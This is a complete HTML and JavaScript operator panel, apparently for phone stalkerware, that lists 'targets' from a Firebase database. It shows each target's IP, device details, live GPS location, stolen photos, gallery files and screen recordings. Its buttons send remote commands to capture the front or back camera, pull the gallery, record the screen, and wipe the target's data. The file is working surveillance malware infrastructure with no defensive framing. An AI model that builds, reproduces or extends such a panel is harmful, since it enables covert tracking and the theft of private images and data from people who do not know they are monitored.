<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>MASTER_V8_ADMIN</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #0a0a0a; --panel: #151515; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 300px; border-right: 2px solid #222; padding: 15px; overflow-y: auto; }
        .card { border: 1px solid #333; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; position: relative; }
        .card:hover, .card.active { background: rgba(0,255,65,0.1); border-color: var(--neon); }
        .online-dot { width: 8px; height: 8px; background: var(--neon); border-radius: 50%; display: inline-block; position: absolute; right: 10px; top: 15px; box-shadow: 0 0 10px var(--neon); }
        
        .main { flex: 1; padding: 25px; overflow-y: auto; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        .box { background: var(--panel); border: 1px solid #222; padding: 15px; border-radius: 8px; }
        .btn { background: none; border: 1px solid var(--neon); color: var(--neon); padding: 8px; cursor: pointer; margin: 5px; font-weight: bold; width: 140px; }
        .btn:hover { background: var(--neon); color: #000; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
        .gallery img, .gallery video { width: 100%; border: 1px solid #333; }
        
        #map-container { width: 100%; height: 200px; background: #000; border: 1px solid #333; margin-top: 10px; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

<div class="sidebar">
    <h2 style="border-bottom: 2px solid var(--neon); padding-bottom: 10px;">V8_COMMANDER</h2>
    <div id="target-list">Connecting Database...</div>
</div>

<div class="main">
    <div id="controls" style="display:none;">
        <h1 id="active-user">Select User</h1>
        <div style="margin-bottom: 20px;">
            <button class="btn" onclick="send('photo')">Front Cam</button>
            <button class="btn" onclick="send('back_photo')">Back Cam</button>
            <button class="btn" onclick="send('gallery_access')">Open Gallery</button>
            <button class="btn" onclick="send('screen_record')">Record Screen</button>
            <button class="btn" style="border-color:red; color:red;" onclick="deleteUser()">Wipe Data</button>
        </div>

        <div class="grid">
            <div class="box">
                <h3>TARGET_LOCATION (Live Tracker)</h3>
                <div id="map-container">No Signal</div>
                <button class="btn" style="width:100%; margin-top:10px;" id="map-btn">OPEN FULL MAP (NEW TAB)</button>
            </div>
            <div class="box">
                <h3>DEVICE_INFO</h3>
                <div id="info-box">...</div>
            </div>
            <div class="box" style="grid-column: span 2;">
                <h3>VISUAL_DATA_FEED (Photos / Gallery / Screen)</h3>
                <div id="media-box" class="gallery"></div>
            </div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedID = null;

    db.ref('targets').on('value', snap => {
        const list = document.getElementById('target-list');
        list.innerHTML = "";
        snap.forEach(t => {
            const id = t.key;
            const data = t.val();
            list.innerHTML += `
                <div class="card ${selectedID === id ? 'active' : ''}" onclick="select('${id}')">
                    <strong>${id}</strong><br><small>${data.info ? data.info.ip : 'Pending'}</small>
                    ${data.info && data.info.status === 'ONLINE' ? '<div class="online-dot"></div>' : ''}
                </div>`;
        });
    });

    function select(id) {
        selectedID = id;
        document.getElementById('controls').style.display = 'block';
        document.getElementById('active-user').innerText = "TRACKING: " + id;
        
        // Info Listener
        db.ref(`targets/${id}/info`).on('value', s => {
            const d = s.val() || {};
            document.getElementById('info-box').innerHTML = `IP: ${d.ip}<br>Batt: ${d.battery}<br>OS: ${d.device}<br>Last: ${d.time}`;
        });

        // Map Listener
        db.ref(`targets/${id}/location`).on('value', s => {
            const loc = s.val();
            if(loc && loc.lat) {
                const url = `https://www.google.com/maps?q=${loc.lat},${loc.lng}&output=embed`;
                document.getElementById('map-container').innerHTML = `<iframe src="${url}"></iframe>`;
                document.getElementById('map-btn').onclick = () => window.open(`https://www.google.com/maps?q=${loc.lat},${loc.lng}`);
            }
        });

        // Media Listener (Combined)
        db.ref(`targets/${id}`).on('value', s => {
            const box = document.getElementById('media-box'); box.innerHTML = "";
            const data = s.val();
            
            // Photos
            if(data.photos) Object.values(data.photos).reverse().forEach(p => {
                box.innerHTML += `<img src="${p.img}" onclick="window.open(this.src)">`;
            });
            // Gallery
            if(data.gallery_files) Object.values(data.gallery_files).forEach(f => {
                box.innerHTML += `<img src="${f.data}" title="${f.name}" onclick="window.open(this.src)">`;
            });
            // Screen Records
            if(data.screen_records) Object.values(data.screen_records).forEach(v => {
                box.innerHTML += `<video controls src="${v.video}" style="height:120px;"></video>`;
            });
        });
    }

    function send(act) { db.ref(`commands/${selectedID}`).set({ action: act, t: Date.now() }); }
    
    function deleteUser() {
        if(confirm("Confirm Wipe?")) { db.ref(`targets/${selectedID}`).remove(); location.reload(); }
    }
</script>
</body>
</html>
